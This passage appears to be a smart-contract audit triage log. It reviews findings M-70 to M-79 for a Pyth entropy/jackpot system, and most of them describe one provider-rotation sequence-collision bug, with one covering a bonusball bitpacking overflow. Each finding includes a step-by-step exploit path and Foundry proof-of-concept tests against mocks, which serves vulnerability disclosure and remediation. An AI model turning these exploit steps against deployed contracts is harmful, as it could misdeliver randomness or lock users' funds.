        return sep.requestAndCallbackScaledRandomness(200000, reqs, this.onRandom.selector, context);
    }

    function onRandom(uint64 sequence, uint256[][] calldata, bytes calldata context) external {
        require(msg.sender == address(sep), "only sep");
        calls += 1;
        lastSequence = sequence;
        lastContext = context;
    }
}

contract ProviderSequenceCollisionPoC is Test {
    function testProviderMigrationOverwritesPendingSequence() public {
        MockEntropy entropy = new MockEntropy();
        address providerA = address(0xA11CE);
        address providerB = address(0xB0B);
        ScaledEntropyProvider sep = new ScaledEntropyProvider(address(entropy), providerA);

        Receiver oldReceiver = new Receiver(sep);
        Receiver newReceiver = new Receiver(sep);

        uint64 oldSeq = oldReceiver.request("old-provider-request");
        assertEq(oldSeq, 1);

        sep.setEntropyProvider(providerB);

        uint64 newSeq = newReceiver.request("new-provider-request");
        assertEq(newSeq, 1);

        entropy.fulfill(address(sep), oldSeq, providerA, bytes32(uint256(123)));

        assertEq(oldReceiver.calls(), 0);
        assertEq(newReceiver.calls(), 1);
        assertEq(newReceiver.lastSequence(), 1);
        assertEq(newReceiver.lastContext(), "new-provider-request");

        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.fulfill(address(sep), newSeq, providerB, bytes32(uint256(456)));
    }
}

## Suggested Mitigation
Scope pending requests by provider and reject overwrites. Store requests as `mapping(address => mapping(uint64 => PendingRequest)) pending`, write under the provider used for the request, and in `entropyCallback` load/delete `pending[provider][sequence]`. Also prevent provider rotation while there are unresolved requests, or track pending counts per provider and require them to be zero before switching.
```

### Current Validated Block
### M-70 / `JNirY2A5L7N-4sAPEQSSD`
- Finding Title: Entropy provider migration can overwrite pending requests with colliding sequence numbers
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Pending entropy requests are keyed by sequence alone even though the callback includes provider identity and provider rotations are documented as future-only. A valid provider migration while old requests are pending can let a new-provider request overwrite the old sequence slot, causing misdelivery or loss of a Jackpot callback. The owner action is a normal maintenance workflow; the overwrite can be triggered by subsequent public requests.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::setEntropyProvider` updates `entropyProvider` without pending checks. `_storePendingRequest` writes `pending[sequence]`, and `entropyCallback` ignores its `provider` argument.

## M-71 / `qQy9NQ79-RRyMstIQufsw`
- Finding title: Provider sequence collisions can overwrite pending entropy requests after provider rotation
- Report lines: 5362-5467

### Original Report Block
```md
## [M-71]. Provider sequence collisions can overwrite pending entropy requests after provider rotation

## id: qQy9NQ79-RRyMstIQufsw

## Derived From Pattern/Invariant
ExternalProtocolKeyCollision

## Exploit Type
ExternalProtocolKeyCollision

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness / setEntropyProvider / entropyCallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The pending mapping is mapping(uint64 => PendingRequest), _storePendingRequest overwrites fields for the same key, and entropyCallback ignores provider. setEntropyProvider can be called while pending requests exist. If two providers assign the same sequence, the later request overwrites the earlier one. This is current code, not speculation, but the collision scenario depends on an owner-only provider rotation.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`pending` is keyed only by the uint64 sequence returned by Pyth, while Pyth request sequence numbers are provider-scoped. `setEntropyProvider()` can switch providers while old requests are still pending, and `_storePendingRequest()` does not reject an already-populated `pending[sequence]`. `entropyCallback()` also ignores the callback `provider` argument. Vulnerable snippet: `mapping(uint64 => PendingRequest) private pending; ... sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit); _storePendingRequest(sequence, ...); ... function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; ... delete pending[sequence]; ... }`. If the new provider returns the same sequence as an old pending provider, the newer request overwrites the older pending entry; later fulfillment from either provider is accepted for whichever callback currently occupies that sequence.

## Impact
A normal provider rotation can cause pending randomness requests to be overwritten or fulfilled with entropy from the wrong provider. In the jackpot flow this can permanently stall a drawing or settle a request with mismatched randomness, locking user/LP funds until emergency handling.

## Proof of Concept
1. A victim request is made through provider A and stores `pending[1]`. 2. Owner rotates to provider B while provider A sequence 1 is still pending. 3. An attacker or any later requester submits a request through provider B, whose sequence counter also returns 1, overwriting `pending[1]`. 4. Provider A fulfills sequence 1; `entropyCallback` ignores the provider argument and delivers provider A randomness to the attacker callback. 5. Provider B fulfillment for sequence 1 then reverts `UnknownSequence`, and the victim request is lost.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/ScaledEntropyProvider.sol";

contract EntropyMock {
    mapping(address => uint64) public nextSeq;
    uint128 public fee = 1 wei;

    function requestV2(address provider, uint32) external payable returns (uint64) {
        nextSeq[provider] += 1;
        return nextSeq[provider];
    }

    function getFeeV2(address, uint32) external view returns (uint128) {
        return fee;
    }

    function fulfill(address consumer, uint64 sequence, address provider, bytes32 randomNumber) external {
        (bool ok, bytes memory data) = consumer.call(
            abi.encodeWithSignature("_entropyCallback(uint64,address,bytes32)", sequence, provider, randomNumber)
        );
        if (!ok) assembly { revert(add(data, 32), mload(data)) }
    }
}

contract CallbackReceiver {
    ScaledEntropyProvider public sep;
    uint256 public deliveries;
    uint64 public lastSequence;
    uint256 public lastValue;

    constructor(ScaledEntropyProvider _sep) { sep = _sep; }

    function request() external payable returns (uint64) {
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 10, withReplacement: true});
        return sep.requestAndCallbackScaledRandomness{value: msg.value}(100000, reqs, this.receiveRandom.selector, "");
    }

    function receiveRandom(uint64 sequence, uint256[][] calldata values, bytes calldata) external {
        deliveries++;
        lastSequence = sequence;
        lastValue = values[0][0];
    }
}

contract ProviderCollisionPoC is Test {
    function testProviderScopedSequenceCollisionOverwritesPendingRequest() external {
        address providerA = address(0xA11CE);
        address providerB = address(0xB0B);
        EntropyMock entropy = new EntropyMock();
        ScaledEntropyProvider sep = new ScaledEntropyProvider(address(entropy), providerA);
        CallbackReceiver victim = new CallbackReceiver(sep);
        CallbackReceiver attacker = new CallbackReceiver(sep);

        uint64 oldSeq = victim.request{value: 1 wei}();
        assertEq(oldSeq, 1);

        sep.setEntropyProvider(providerB);
        uint64 collidingSeq = attacker.request{value: 1 wei}();
        assertEq(collidingSeq, oldSeq);

        entropy.fulfill(address(sep), oldSeq, providerA, bytes32(uint256(123)));
        assertEq(attacker.deliveries(), 1);
        assertEq(victim.deliveries(), 0);

        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.fulfill(address(sep), collidingSeq, providerB, bytes32(uint256(456)));
    }
}

## Suggested Mitigation
Key pending requests by both provider and sequence, e.g. `mapping(address => mapping(uint64 => PendingRequest))`, store the provider used for each request, reject overwrites, and in `entropyCallback` require the callback provider to match the stored provider before delivery.
```

### Current Validated Block
### M-71 / `qQy9NQ79-RRyMstIQufsw`
- Finding Title: Provider sequence collisions can overwrite pending entropy requests after provider rotation
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The same provider-scoped sequence collision is live: after an owner rotates providers with pending requests, a colliding new-provider sequence overwrites the old `pending[sequence]` entry. Because fulfillment ignores provider, entropy can be delivered to the wrong callback or the intended callback can be lost. This can block Jackpot settlement for an in-flight draw.
- Code Evidence: `contracts/ScaledEntropyProvider.sol` uses `mapping(uint64 => PendingRequest) private pending`; `_storePendingRequest` has no overwrite check; `entropyCallback(uint64 sequence, address /*provider*/, ...)` reads only `pending[sequence]`.

## M-73 / `FgRFBZujzUDHT5TlbsOr6`
- Finding title: Entropy provider rotation can overwrite pending randomness requests with colliding sequence numbers
- Report lines: 5503-5616

### Original Report Block
```md
## [M-73]. Entropy provider rotation can overwrite pending randomness requests with colliding sequence numbers

## id: FgRFBZujzUDHT5TlbsOr6

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash: pending requests are keyed only by provider-local sequence number, so entropy provider rotation can collide old and new request IDs

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
ScaledEntropyProvider.setEntropyProvider

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The root cause exists: pending requests are stored under sequence only, setEntropyProvider is allowed during pending requests, and entropyCallback discards the callback provider. _storePendingRequest overwrites callback, selector, and context and pushes new setRequests into any existing array at that sequence. No provider scoping or overwrite check exists. Exploitation requires an owner provider rotation, so the privileged-actor flag is true.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`ScaledEntropyProvider` stores pending requests only by `uint64 sequence`, while Pyth Entropy sequence numbers are scoped to each provider. After the owner rotates `entropyProvider`, the new provider can return a sequence number already used by an unfulfilled request from the old provider. `_storePendingRequest()` then overwrites `callback`, `selector`, and `context` for `pending[sequence]` and appends new `setRequests` without clearing the previous dynamic array. Because `entropyCallback()` ignores its `provider` argument, a later fulfillment from either provider can deliver randomness to the wrong callback with mixed request parameters, delete the shared slot, and permanently strand the other request. Vulnerable snippets: `mapping(uint64 => PendingRequest) private pending;`, `function setEntropyProvider(address _entropyProvider) external onlyOwner { ... entropyProvider = _entropyProvider; }`, `sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit); _storePendingRequest(sequence, ...)`, and `function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; ... }`.

## Impact
A normal provider rotation while requests are pending can corrupt randomness delivery. For an integrated jackpot flow this can leave a drawing without its intended callback, deliver another requester's randomness/context instead, or delete the pending slot so the legitimate fulfillment reverts as `UnknownSequence`, causing drawing progression or settlement to become stuck.

## Proof of Concept
1. A requester creates a pending request while `entropyProvider` is provider A; Pyth assigns sequence 1 and `pending[1]` stores requester A. 2. The owner rotates to provider B before provider A fulfills. 3. Another requester creates a request; provider B also assigns sequence 1 because sequence numbers are provider-local. 4. `_storePendingRequest(1, ...)` overwrites the callback/context and appends request B's set to the old dynamic array. 5. Provider A fulfills sequence 1; `entropyCallback` ignores the provider argument, calls requester B with provider A's randomness and both request sets, then deletes `pending[1]`. Requester A never receives randomness, and provider B's later fulfillment reverts as unknown.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "../contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "../contracts/interfaces/IScaledEntropyProvider.sol";

interface IEntropyConsumerLike {
    function _entropyCallback(uint64 sequence, address provider, bytes32 randomNumber) external;
}

contract EntropyMock {
    mapping(address => uint64) public nextSeq;

    function getFeeV2(address, uint32) external pure returns (uint128) {
        return 0;
    }

    function requestV2(address provider, uint32) external payable returns (uint64 assignedSequenceNumber) {
        assignedSequenceNumber = nextSeq[provider];
        if (assignedSequenceNumber == 0) assignedSequenceNumber = 1;
        nextSeq[provider] = assignedSequenceNumber + 1;
    }

    function fulfill(address consumer, uint64 sequence, address provider, bytes32 randomNumber) external {
        IEntropyConsumerLike(consumer)._entropyCallback(sequence, provider, randomNumber);
    }
}

contract Receiver {
    uint256 public calls;
    uint64 public lastSequence;
    uint256 public lastOuterLength;
    bytes public lastContext;

    function request(
        ScaledEntropyProvider sep,
        IScaledEntropyProvider.SetRequest[] calldata reqs,
        bytes calldata context
    ) external returns (uint64) {
        return sep.requestAndCallbackScaledRandomness{value: 0}(200000, reqs, this.onRandomness.selector, context);
    }

    function onRandomness(uint64 sequence, uint256[][] calldata nums, bytes calldata context) external {
        calls++;
        lastSequence = sequence;
        lastOuterLength = nums.length;
        lastContext = context;
    }
}

contract ScaledEntropyProviderProviderCollisionTest is Test {
    function testProviderRotationCollidesAndMisdeliversPendingRequest() public {
        address providerA = address(0xA11CE);
        address providerB = address(0xB0B);
        EntropyMock entropy = new EntropyMock();
        ScaledEntropyProvider sep = new ScaledEntropyProvider(address(entropy), providerA);
        Receiver alice = new Receiver();
        Receiver bob = new Receiver();

        IScaledEntropyProvider.SetRequest[] memory first = new IScaledEntropyProvider.SetRequest[](1);
        first[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 10, withReplacement: true});
        uint64 seqA = alice.request(sep, first, bytes("alice"));
        assertEq(seqA, 1);

        sep.setEntropyProvider(providerB);

        IScaledEntropyProvider.SetRequest[] memory second = new IScaledEntropyProvider.SetRequest[](1);
        second[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 20, withReplacement: true});
        uint64 seqB = bob.request(sep, second, bytes("bob"));
        assertEq(seqB, 1);

        entropy.fulfill(address(sep), seqA, providerA, bytes32(uint256(123)));

        assertEq(alice.calls(), 0);
        assertEq(bob.calls(), 1);
        assertEq(bob.lastSequence(), 1);
        assertEq(bob.lastOuterLength(), 2);
    }
}

## Suggested Mitigation
Key pending requests by both provider and sequence, for example `mapping(address => mapping(uint64 => PendingRequest))`, store the provider in `PendingRequest`, and require the callback `provider` argument to match the stored provider before fulfillment. Also reject or explicitly migrate provider changes while any pending requests for the old provider remain, and clear an existing dynamic `setRequests` array before reusing a slot.
```

### Current Validated Block
### M-73 / `FgRFBZujzUDHT5TlbsOr6`
- Finding Title: Entropy provider rotation can overwrite pending randomness requests with colliding sequence numbers
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The provider/sequence namespace bug is real, and this version also notes that overwriting a reused mapping slot appends request data into the existing dynamic array rather than clearing it first. A normal provider rotation with pending requests can corrupt callback metadata and request parameters, which can strand or misdeliver Jackpot randomness. That is a material liveness/fairness impact.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::_storePendingRequest` assigns callback, selector, and context at `pending[sequence]` and then pushes each request into `pending[sequence].setRequests`. `entropyCallback` ignores provider and deletes only by sequence after delivery.

## M-76 / `fVsK-LAQ7IPQ6NH8i6z49`
- Finding title: Valid high bonusball values overflow ticket bitpacking and can lock settlement
- Report lines: 5738-5777

### Original Report Block
```md
## [M-76]. Valid high bonusball values overflow ticket bitpacking and can lock settlement

## id: fVsK-LAQ7IPQ6NH8i6z49

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath: bitpacking boundary is not enforced for normalMax + bonusball

## Exploit Type
IntegerMath

## Location
TicketComboTracker.insert / countTierMatchesWithBonusball

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code lacks a guard that every valid bonusball can be encoded with normalMax + bonusball <= 255. Under a high admin-configured bonusball range, TicketComboTracker.insert or countTierMatchesWithBonusball will evaluate checked uint8 addition and revert for out-of-bound sums. During entropy fulfillment this happens after runJackpot has locked the drawing, blocking normal settlement. This is current in scoped code and not fully safeguarded, but the invalid range requires privileged configuration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Ticket bitpacking assumes `normalMax + bonusball` is a valid uint256 bit index, but neither `Jackpot._setNewDrawingState` nor `TicketComboTracker.init` enforces `normalMax + bonusballMax <= 255`. Vulnerable snippet: `ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax);` and `winningTicket = set | (1 << (_bonusball + _tracker.normalMax));`. With `normalMax = 128` and `bonusballMax = 128`, bonusball 128 is accepted by drawing bounds but `_bonusball + _tracker.normalMax` overflows the uint8 addition in Solidity 0.8 and reverts.

## Impact
Some in-range tickets cannot be bought. More importantly, if entropy draws an in-range bonusball above the packing boundary, settlement reverts in the callback and the drawing remains locked until privileged recovery. This blocks normal jackpot progression and delays users and LPs.

## Proof of Concept
1. A drawing is initialized with `ballMax + bonusballMax > 255`, e.g. `128 + 128`. 2. The protocol still treats bonusball 128 as valid because it is `<= bonusballMax`. 3. Any purchase or settlement path that packs this bonusball evaluates `1 << (_bonusball + normalMax)`. 4. The uint8 addition overflows/reverts, so the valid ticket or callback fails. 5. If this happens during entropy fulfillment, the drawing remains locked.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "../contracts/lib/TicketComboTracker.sol";
contract TrackerHarness { using TicketComboTracker for TicketComboTracker.Tracker; TicketComboTracker.Tracker internal t; function init(uint8 n,uint8 b) external { t.init(n,b,5); } function insertHighBonus() external { uint8[] memory normals=new uint8[](5); normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5; t.insert(normals,128); } }
contract BitpackingBoundaryPoC is Test { function testInRangeBonusballOverflowsPacking() external { TrackerHarness h=new TrackerHarness(); h.init(128,128); vm.expectRevert(); h.insertHighBonus(); } }

## Suggested Mitigation
Validate the packing boundary whenever drawing parameters are initialized or updated: require `uint256(normalBallMax) + uint256(bonusballMax) <= 255`. Perform the addition as `uint256` before shifting, and reject any drawing configuration that cannot encode every valid bonusball.
```

### Current Validated Block
### M-76 / `fVsK-LAQ7IPQ6NH8i6z49`
- Finding Title: Valid high bonusball values overflow ticket bitpacking and can lock settlement
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `bonusball-settlement-dos`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: This finding correctly frames the missing bound as a reversion/DoS. A drawing can be initialized with a bonusball range whose high values cannot be encoded with `normalMax + bonusball <= 255`. If entropy returns one of those in-range high values, `countTierMatchesWithBonusball` reverts during the locked callback, blocking normal settlement and requiring emergency or privileged recovery.
- Code Evidence: `contracts/Jackpot.sol::_setNewDrawingState` sets `newDrawingState.bonusballMax` and calls `TicketComboTracker.init` without checking `normalBallMax + newBonusball <= 255`. `contracts/lib/TicketComboTracker.sol::countTierMatchesWithBonusball` packs the winning bonusball with checked `uint8` addition in `1 << (_bonusball + _tracker.normalMax)`.

## M-77 / `YrzefVI2gaRcji1F4O2lj`
- Finding title: Provider rotation can collide Pyth sequence IDs and overwrite pending entropy requests
- Report lines: 5778-5922

### Original Report Block
```md
## [M-77]. Provider rotation can collide Pyth sequence IDs and overwrite pending entropy requests

## id: YrzefVI2gaRcji1F4O2lj

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash / external protocol request ID not scoped to provider after configuration change

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness / entropyCallback / setEntropyProvider

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code comment says provider updates affect future requests, but storage does not isolate old pending requests from new-provider sequence IDs. pending is sequence-only, _storePendingRequest has no live-entry guard, and entropyCallback ignores provider. A same-sequence request after owner rotation can overwrite old data and cause misdelivery or deletion. The precondition is an owner-only provider change.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`ScaledEntropyProvider` keys `pending` only by Pyth's `uint64 sequence` and ignores the `provider` supplied to `entropyCallback`, even though Pyth request state is provider-scoped. When the owner rotates `entropyProvider` while old requests are still pending, the new provider can return a sequence number already used by the old provider. `_storePendingRequest` then overwrites `callback`, `selector`, and `context` and appends to the existing dynamic `setRequests` array without clearing it. A later fulfillment from the old provider is accepted and delivered to the new callback, deleting the new request and orphaning the original one. Vulnerable snippet: `mapping(uint64 => PendingRequest) private pending; ... sequence = entropy.requestV2{value: msg.value}(entropyProvider, _gasLimit); _storePendingRequest(sequence, _selector, _context, _requests); ... function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; ... delete pending[sequence]; ... }`. The comment on `setEntropyProvider` says it only affects future requests, but pending requests are not isolated from future provider sequence IDs.

## Impact
A routine provider migration with outstanding requests can deliver an old provider's randomness to the wrong requester, include stale SetRequest data in the callback, delete the wrong pending request, and leave the original request permanently undelivered. For a lottery consumer this can stall settlement or settle using randomness and request parameters from a different request.

## Proof of Concept
1. A consumer creates a request through provider A and receives sequence S. 2. The owner rotates the entropy provider to provider B while S is still pending. 3. A second consumer creates a request through provider B and receives the same sequence S because Pyth sequences are provider-scoped. 4. `_storePendingRequest` overwrites `pending[S]` and appends the new request parameters to the old dynamic array. 5. Provider A fulfills S; `entropyCallback` ignores the provider argument, calls the second consumer with mixed old/new parameters, and deletes `pending[S]`. 6. Provider B's real fulfillment for S now reverts `UnknownSequence`, while the first consumer never receives randomness.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/ScaledEntropyProvider.sol";
import "../contracts/interfaces/IScaledEntropyProvider.sol";

interface IEntropyCallbackTarget {
    function _entropyCallback(uint64 sequence, address provider, bytes32 randomNumber) external;
}

contract MockEntropyV2 {
    uint128 public fee = 1 wei;
    mapping(address => uint64) public nextSequence;

    function setNextSequence(address provider, uint64 sequence) external {
        nextSequence[provider] = sequence;
    }

    function getFeeV2(address, uint32) external view returns (uint128) {
        return fee;
    }

    function requestV2(address provider, uint32) external payable returns (uint64 assignedSequenceNumber) {
        assignedSequenceNumber = nextSequence[provider];
        nextSequence[provider] = assignedSequenceNumber + 1;
    }

    function fulfill(address consumer, uint64 sequence, address provider, bytes32 randomNumber) external {
        IEntropyCallbackTarget(consumer)._entropyCallback(sequence, provider, randomNumber);
    }
}

contract RandomnessConsumer {
    ScaledEntropyProvider public immutable scaledEntropy;
    bool public called;
    uint64 public lastSequence;
    uint256 public lastOuterLength;

    constructor(ScaledEntropyProvider _scaledEntropy) {
        scaledEntropy = _scaledEntropy;
    }

    function request(IScaledEntropyProvider.SetRequest[] memory requests) external payable returns (uint64) {
        return scaledEntropy.requestAndCallbackScaledRandomness{value: msg.value}(
            200_000,
            requests,
            this.receiveRandomness.selector,
            ""
        );
    }

    function receiveRandomness(uint64 sequence, uint256[][] calldata randomNumbers, bytes calldata) external {
        called = true;
        lastSequence = sequence;
        lastOuterLength = randomNumbers.length;
    }
}

contract ScaledEntropyProviderSequenceCollisionTest is Test {
    MockEntropyV2 entropy;
    ScaledEntropyProvider scaledEntropy;
    RandomnessConsumer oldConsumer;
    RandomnessConsumer newConsumer;
    address oldProvider = address(0xA11CE);
    address newProvider = address(0xB0B);

    function setUp() public {
        entropy = new MockEntropyV2();
        entropy.setNextSequence(oldProvider, 7);
        entropy.setNextSequence(newProvider, 7);
        scaledEntropy = new ScaledEntropyProvider(address(entropy), oldProvider);
        oldConsumer = new RandomnessConsumer(scaledEntropy);
        newConsumer = new RandomnessConsumer(scaledEntropy);
    }

    function oneRequest(uint256 minRange) internal pure returns (IScaledEntropyProvider.SetRequest[] memory requests) {
        requests = new IScaledEntropyProvider.SetRequest[](1);
        requests[0] = IScaledEntropyProvider.SetRequest({
            samples: 1,
            minRange: minRange,
            maxRange: minRange + 10,
            withReplacement: true
        });
    }

    function testProviderSequenceCollisionOverwritesOldPendingRequest() public {
        uint64 oldSequence = oldConsumer.request{value: 1 wei}(oneRequest(1));
        assertEq(oldSequence, 7);

        scaledEntropy.setEntropyProvider(newProvider);

        uint64 newSequence = newConsumer.request{value: 1 wei}(oneRequest(100));
        assertEq(newSequence, oldSequence);

        ScaledEntropyProvider.PendingRequest memory pending = scaledEntropy.getPendingRequest(oldSequence);
        assertEq(pending.callback, address(newConsumer));
        assertEq(pending.setRequests.length, 2, "old dynamic array entries were not cleared before append");

        entropy.fulfill(address(scaledEntropy), oldSequence, oldProvider, bytes32(uint256(123)));

        assertFalse(oldConsumer.called(), "old provider fulfillment did not reach the original requester");
        assertTrue(newConsumer.called(), "old provider fulfillment was delivered to the new requester");
        assertEq(newConsumer.lastSequence(), oldSequence);
        assertEq(newConsumer.lastOuterLength(), 2, "new requester received old and new request parameters");

        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.fulfill(address(scaledEntropy), newSequence, newProvider, bytes32(uint256(456)));
    }
}


## Suggested Mitigation
Store the provider used for each request and key pending requests by `(provider, sequence)` or by `keccak256(abi.encode(provider, sequence))`. In `entropyCallback`, require the callback `provider` to match the stored provider. Also clear any existing dynamic array before writing a reused key, or reject any key that is already pending. Provider rotation should either be disallowed while pending requests exist or should not share the same pending namespace.
```

### Current Validated Block
### M-77 / `YrzefVI2gaRcji1F4O2lj`
- Finding Title: Provider rotation can collide Pyth sequence IDs and overwrite pending entropy requests
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Provider rotation while requests are pending is allowed, but pending requests are not namespaced by provider and are overwritten by sequence. Because Pyth V2 request identity is provider-scoped, a new provider can reuse an old sequence and corrupt or consume the wrong callback. This can strand an in-flight Jackpot drawing after a normal migration.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::setEntropyProvider` changes `entropyProvider`; `requestAndCallbackScaledRandomness` stores by returned `sequence`; `entropyCallback` ignores the provider argument.

## M-78 / `uxV4GUomOSDggeWGNWLva`
- Finding title: Entropy provider rotation can overwrite pending randomness requests with colliding sequence numbers
- Report lines: 5923-5957

### Original Report Block
```md
## [M-78]. Entropy provider rotation can overwrite pending randomness requests with colliding sequence numbers

## id: uxV4GUomOSDggeWGNWLva

## Derived From Pattern/Invariant
ExternalProtocolKeyCollision

## Exploit Type
ExternalProtocolKeyCollision

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness / _storePendingRequest

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The pending request key is only uint64 sequence, _storePendingRequest overwrites the mapping slot, and entropyCallback ignores provider. Pyth exposes provider-scoped requests, so the same sequence can exist under different providers. No overwrite check or provider namespace protects pending Jackpot callbacks. The in-scope code supports the described overwrite/misdelivery path. Provider rotation is owner-only, making exploitation dependent on privileged configuration, but the defect exists now.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`ScaledEntropyProvider` keys pending requests only by Pyth `sequence`: `mapping(uint64 => PendingRequest) private pending;`. Pyth request lookup is provider-scoped (`getRequestV2(address provider, uint64 sequenceNumber)`), so different providers can issue the same sequence number. `setEntropyProvider` can rotate the provider while old requests remain pending, and `_storePendingRequest(sequence, ...)` overwrites `pending[sequence]` without including the provider/source. After rotation, any caller can create a request through the new provider with a colliding sequence and replace the Jackpot callback metadata for the old provider's pending request.

## Impact
A pending Jackpot randomness request can be overwritten after provider rotation, causing the old fulfillment to be delivered to the wrong callback or to fail. The Jackpot drawing remains locked and cannot settle through the normal entropy path.

## Proof of Concept
1. Jackpot calls `requestAndCallbackScaledRandomness` through provider A and receives sequence 1, storing `pending[1] = Jackpot callback`. 2. The ScaledEntropyProvider owner rotates to provider B. 3. Attacker calls `requestAndCallbackScaledRandomness`; provider B also returns sequence 1 because sequences are provider-scoped. 4. `_storePendingRequest(1, ...)` overwrites the Jackpot pending request. 5. Provider A fulfills sequence 1, but `pending[1]` no longer points to Jackpot, so the drawing callback is lost and Jackpot remains locked.

## Proof of Code
function test_providerScopedSequenceCollisionOverwritesPendingJackpotRequest() public { MockEntropy entropy = new MockEntropy(); ScaledEntropyProvider sep = new ScaledEntropyProvider(address(entropy), providerA); JackpotCallbackMock jackpotCb = new JackpotCallbackMock(); vm.prank(address(jackpotCb)); uint64 aSeq = sep.requestAndCallbackScaledRandomness{value: 1 ether}(100000, oneRequest(), jackpotCb.receiveRandom.selector, bytes('')); assertEq(aSeq, 1); sep.setEntropyProvider(providerB); AttackerCallback attackerCb = new AttackerCallback(); vm.prank(address(attackerCb)); uint64 bSeq = sep.requestAndCallbackScaledRandomness{value: 1 ether}(100000, oneRequest(), attackerCb.receiveRandom.selector, bytes('')); assertEq(bSeq, 1); IScaledEntropyProvider.PendingRequest memory pending = sep.getPendingRequest(1); assertEq(pending.callback, address(attackerCb)); assertTrue(pending.callback != address(jackpotCb)); }

## Suggested Mitigation
Store pending requests under a composite key such as `keccak256(abi.encode(provider, sequence))`, persist the provider in `PendingRequest`, and verify the callback provider argument matches the stored provider. Also block provider rotation while requests are pending or maintain separate pending namespaces per provider.
```

### Current Validated Block
### M-78 / `uxV4GUomOSDggeWGNWLva`
- Finding Title: Entropy provider rotation can overwrite pending randomness requests with colliding sequence numbers
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The sequence-only pending key makes old-provider and new-provider requests collide after rotation. Once a later request overwrites the slot, an old fulfillment no longer reaches the intended Jackpot callback, so the locked drawing can remain unsettled. The path is current code and not blocked by any pending-request guard.
- Code Evidence: `contracts/ScaledEntropyProvider.sol` declares `mapping(uint64 => PendingRequest) private pending`; `_storePendingRequest(sequence, ...)` overwrites that slot; `entropyCallback` uses only `sequence` to load and delete.

## M-79 / `Eo7DO9DiVWIGLlFfnfy0D`
- Finding title: Entropy pending requests are keyed only by sequence and collide across provider rotations
- Report lines: 5958-5992

### Original Report Block
```md
## [M-79]. Entropy pending requests are keyed only by sequence and collide across provider rotations

## id: Eo7DO9DiVWIGLlFfnfy0D

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider.setEntropyProvider / entropyCallback

## Finding Status: InvalidGovernanceRisk
